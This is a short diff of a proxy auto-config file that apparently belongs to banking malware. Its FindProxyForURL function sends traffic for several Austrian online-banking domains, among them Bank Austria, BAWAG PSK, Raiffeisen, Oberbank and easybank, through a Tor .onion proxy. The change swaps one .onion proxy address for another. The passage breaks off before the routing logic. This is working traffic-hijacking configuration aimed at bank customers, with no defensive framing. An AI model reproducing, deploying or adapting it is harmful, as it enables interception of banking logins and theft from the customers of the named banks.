@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY s5jhnylq4yi7omen.onion:5588;";
+    var proxy = "PROXY 6aaoqcl2leiptpvn.onion:5588;";
     var hosts = new Array('*bankaustria.at', '*.bawagpsk.com', '*raiffeisen.at',
         '*.bawag.com', 'www.banking.co.at', '*oberbank.at',
         'www.oberbank-banking.at', '*.easybank.at');
